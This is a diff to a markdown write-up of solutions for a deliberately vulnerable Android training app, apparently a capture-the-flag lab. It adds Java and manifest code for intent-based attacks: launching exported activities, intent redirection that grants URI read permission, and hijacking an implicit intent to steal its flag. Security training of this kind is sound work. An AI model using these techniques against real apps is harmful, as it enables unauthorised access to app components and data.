@@ -10,6 +10,8 @@ description: >-
 
 ### Basic Intent
 
+This code defines an `onClick` event that creates an explicit `Intent` to launch `Flag1Activity` within the `io.hextree.attacksurface` package when triggered.
+
 {% code overflow="wrap" %}
 ```java
 public void onClick(View v) {
@@ -21,6 +23,8 @@ public void onClick(View v) {
 {% endcode %}
 
 ### Intent with extras
+
+This `onClick` event creates an explicit `Intent` to launch `Flag2Activity` within the `io.hextree.attacksurface` package, setting the action to `"io.hextree.action.GIVE_FLAG"` before starting the activity.
 
 {% code overflow="wrap" %}
 ```java
@@ -35,19 +39,20 @@ public void onClick(View v) {
 
 ### Intent with data URI
 
-{% code overflow="wrap" %}
-```java
-public void onClick(View v) {
-    Intent intent = new Intent();
+This `onClick` event creates an explicit `Intent` to launch `Flag3Activity` within the `io.hextree.attacksurface` package, setting the action to `"io.hextree.action.GIVE_FLAG"` and providing a data URI pointing to `"https://app.hextree.io/map/android"` before starting the activity.
+
+<pre class="language-java" data-overflow="wrap"><code class="lang-java"><strong>public void onClick(View v) {
+</strong>    Intent intent = new Intent();
     intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity"));
     intent.setAction("io.hextree.action.GIVE_FLAG");
     intent.setData(Uri.parse("https://app.hextree.io/map/android"));
     startActivity(intent);
 }
-```
-{% endcode %}
+</code></pre>
 
 ### Multiple Intent calls
+
+This `onClick` event sequentially launches `Flag4Activity` multiple times with different actions (`"PREPARE_ACTION"`, `"BUILD_ACTION"`, `"GET_FLAG_ACTION"`, `"INIT_ACTION"`), pausing for one second between each launch. Each `Intent` explicitly targets `Flag4Activity` within the `io.hextree.attacksurface` package to execute distinct actions in a specific order.
 
 {% code overflow="wrap" %}
 ```java
@@ -93,7 +98,9 @@ public void onClick(View v) {
 ```
 {% endcode %}
 
-### Nested Intents
+### Nested Intents (Intent in Intent)
+
+This `onClick` event creates a chain of nested `Intents` to launch `Flag5Activity` in the `io.hextree.attacksurface` package. The primary `mainIntent` contains a nested `Intent` (`nestedIntent1`) with an extra key `"return"` set to `42`. Inside `nestedIntent1`, another `Intent` (`nestedIntent2`) is nested with an extra `"reason"` set to `"back"`. This structured setup initiates `Flag5Activity` with a chain of `Intents` for conditional processing.
 
 ```java
 public void onClick(View v) {
@@ -114,7 +121,36 @@ public void onClick(View v) {
 }
 ```
 
+### Intent Redirect (Intent Forwarding)
+
+This `onClick` event constructs a series of nested `Intents` to initiate `Flag5Activity` in the `io.hextree.attacksurface` package. The main `Intent`, `mainIntent`, includes a nested `Intent` (`nestedIntent1`) with an extra key `"return"` set to `42`. Inside `nestedIntent1`, a secondary nested `Intent` (`nestedIntent2`) is configured to start `Flag6Activity`, with extras `"reason"` set to `"next"` and the flag `FLAG_GRANT_READ_URI_PERMISSION`. This layered structure directs `Flag5Activity` to process `nestedIntent1` and, conditionally, initiate `Flag6Activity`.
+
+{% code overflow="wrap" %}
+```java
+public void onClick(View v) {
+    Intent mainIntent = new Intent();
+    mainIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
+
+    Intent nestedIntent1 = new Intent();
+    nestedIntent1.putExtra("return", 42);
+
+    Intent nestedIntent2 = new Intent();
+    nestedIntent2.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
+    nestedIntent2.putExtra("reason", "next");
+    nestedIntent2.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+
+    nestedIntent1.putExtra("nextIntent", nestedIntent2);
+
+    mainIntent.putExtra("android.intent.extra.INTENT", nestedIntent1);
+
+    startActivity(mainIntent);
+}
+```
+{% endcode %}
+
 ### Intent activity lifecycle
+
+This `onClick` event sequentially launches `Flag7Activity` in the `io.hextree.attacksurface` package with two distinct actions. First, it starts `Flag7Activity` with the `"OPEN"` action. After a one-second pause, it launches `Flag7Activity` again with the `"REOPEN"` action, adding the `FLAG_ACTIVITY_SINGLE_TOP` flag to prevent creating a new instance if `Flag7Activity` is already at the top of the activity stack.
 
 ```java
 public void onClick(View v) {
@@ -134,6 +170,163 @@ public void onClick(View v) {
     reopenIntent.setAction("REOPEN");
     reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
     startActivity(reopenIntent);
+}
+```
+
+### Intent returning Activity results
+
+`HextreeLauncherActivity` displays a button that, when clicked, launches `Flag8Activity` using `startActivityForResult` to enable it to verify the calling activity’s identity. If `Flag8Activity` returns a result, `onActivityResult` can optionally handle it.
+
+```java
+public class HextreeLauncherActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_hextree_launcher);
+
+        // Set up the button listener to launch Flag8Activity
+        Button launchButton = findViewById(R.id.launchFlag8Button);
+        launchButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                launchFlag8Activity();
+            }
+        });
+    }
+
+    public void launchFlag8Activity() {
+        // Create an explicit Intent to launch Flag8Activity
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity"));
+        startActivityForResult(intent, 1); // Use startActivityForResult to ensure getCallingActivity works in Flag8Activity
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        // Optionally, handle any returned result from Flag8Activity here
+    }
+}
+```
+
+### Intent returning Activity results + conditions
+
+`HextreeLauncherActivity` displays a button that, when clicked, launches `Flag9Activity` to request a flag. Once `Flag9Activity` returns, `HextreeLauncherActivity` retrieves and displays the flag via a `Toast` message if the result is successful.
+
+```java
+public class HextreeLauncherActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_hextree_launcher);
+
+        // Set up the button listener to launch Flag8Activity
+        Button launchButton = findViewById(R.id.launchFlag8Button);
+        launchButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                launchFlag9Activity();
+            }
+        });
+    }
+
+    public void launchFlag9Activity() {
+        // Create an explicit Intent to launch Flag9Activity
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag9Activity"));
+        startActivityForResult(intent, 1); // Use startActivityForResult to ensure getCallingActivity works in Flag9Activity
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+
+        if (requestCode == 1 && resultCode == Activity.RESULT_OK && data != null) {
+            // Retrieve the flag from the intent data
+            String flag = data.getStringExtra("flag");
+            if (flag != null) {
+                // Display the flag using a Toast or any preferred method
+                Toast.makeText(this, "Received flag: " + flag, Toast.LENGTH_LONG).show();
+            }
+        }
+    }
+}
+```
+
+### Hijack Implicit Intents
+
+Manifest.xml
+
+<pre class="language-xml"><code class="lang-xml">&#x3C;activity
+    android:name=".SecondActivity"
+    android:exported="true">
+<strong>    &#x3C;intent-filter>
+</strong>        &#x3C;action android:name="io.hextree.attacksurface.ATTACK_ME"/>
+        &#x3C;category android:name="android.intent.category.DEFAULT" />
+    &#x3C;/intent-filter>
+&#x3C;/activity>
+</code></pre>
+
+`SecondActivity` listens for an implicit intent with the action `"io.hextree.attacksurface.ATTACK_ME"`. When launched, it retrieves a flag from the intent’s extras, displays it with a `Toast`, and returns a result if needed before finishing.
+
+{% code overflow="wrap" %}
+```java
+public class SecondActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        // Check if the intent action matches the expected action
+        Intent intent = getIntent();
+        if ("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())) {
+            // Retrieve the flag from the intent's extras
+            String flag = intent.getStringExtra("flag");
+
+            if (flag != null) {
+                // Display the flag using a Toast
+                Toast.makeText(this, "Received flag: " + flag, Toast.LENGTH_LONG).show();
+
+                // Optionally, send a result back if needed
+                Intent resultIntent = new Intent();
+                resultIntent.putExtra("received_flag", flag);
+                setResult(Activity.RESULT_OK, resultIntent);
+            } else {
+                Toast.makeText(this, "Flag not found in intent", Toast.LENGTH_SHORT).show();
+            }
+        } else {
+            Toast.makeText(this, "Incorrect intent action", Toast.LENGTH_SHORT).show();
+        }
+
+        finish();
+    }
+}
+```
+{% endcode %}
+
+### Hijack Implicit Intents (+ respond a specific result)
+
+`SecondActivity` listens for an implicit intent with the action `"io.hextree.attacksurface.ATTACK_ME"`. Upon receiving it, the activity creates a result intent containing a specific token (`1094795585`) and returns it to the calling activity, then finishes.
+
+```java
+public class SecondActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        Intent intent = getIntent();
+        if ("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())) {
+            Intent resultIntent = new Intent();
+            resultIntent.putExtra("token", 1094795585);
+            setResult(RESULT_OK, resultIntent);
+            finish();
+        }
+
+        finish();
+    }
 }
 ```
 
